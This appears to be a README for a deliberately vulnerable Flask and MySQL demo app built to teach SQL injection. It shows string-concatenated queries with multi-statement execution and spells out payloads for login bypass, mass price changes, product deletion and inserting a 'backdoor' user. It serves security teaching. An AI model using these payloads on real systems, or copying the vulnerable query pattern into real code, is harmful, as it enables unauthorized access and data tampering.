# SQL-Injection-Demo

## Project Overview
This project is a demo of SQL Injection vulnerabilities in a simple web application. It implements a deliberately vulnerable Flask web application to showcase various SQL injection attack vectors and their impacts. 

## Project Structure
sql-injection-demo/'

├── app.py        

├── setup.sql     

├── templates/

│   ├── login.html     

│   ├── products.html    

│   └── add_product.html    

├── static/

│   └── css/

│       └── style.css      

└── README.md

##Features

Login Bypass: Enter a sql statement to bypass the login form, logging in as a random user. 
INSERT Injection: Product creation form vulnerable to injection
Delete Injection: Remove products via injection

##Technology Stack

Backend: Python 3 with Flask framework
Database: MySQL with PyMySQL connector
Frontend: HTML, CSS


##Implementation Approach
### 1. Vulnerable Query Construction
The application uses string concatenation instead of parameterized queries:


query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pwd}';"
cursor.execute(query)
This allows attackers to inject malicious SQL by manipulating the username or password fields.

### 2. Multi-Statement Support
The MySQL connection is configured to allow multiple statements:
pythondb = pymysql.connect(
    host="localhost",
    user="root", #REPLACE WITH USER 
    password="password", #REPLACE WITH YOUR MYSQL PASSWORD
    database="injection_demo",
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
)
This enables advanced attacks like dropping tables or inserting malicious data.


### 3. Attack Surface Areas
Login Form (/login)

Username and password fields both vulnerable
Allows authentication bypass and data extraction

Add Product Form (/add_product)

Product name field vulnerable to injection
Enables database manipulation through INSERT statements


## Injections and Vulnerabilities Example
### 1. OR-Based Login Bypass
In the login page enter the attack in the password field, and anything for the username.
Attack: ' OR '1'='1' #
SELECT * FROM users WHERE username = '' OR '1'='1' # ' AND password
<img width="1876" height="937" alt="image" src="https://github.com/user-attachments/assets/ed807ccf-b47e-4b59-8f52-2c380919ab9c" />

<img width="1846" height="772" alt="image" src="https://github.com/user-attachments/assets/27fc5a2b-2085-4080-8993-e3f7131ed52f" />
In the password field, I entered the SQL injection statement, and logged in as a username that is gibberish, and not in the database. 


### 2. Update all Prices to specific amount ($0.01)
In the products page, enter the attack. 
Attack: x', 0); UPDATE products SET price = 0.01; #
Price: 0

### 3. Delete specific product
In the products page, you can delete a product by name.
Attack: *x', 0); DELETE FROM products WHERE name = 'Laptop'; #
Price: 0

### 4.  Insert malicious user
Through the add products page, you can enter a statement to insert a user into the table.
Attack: Test', 0); INSERT INTO users (username, password) VALUES ('backdoor', 'secret'); # 
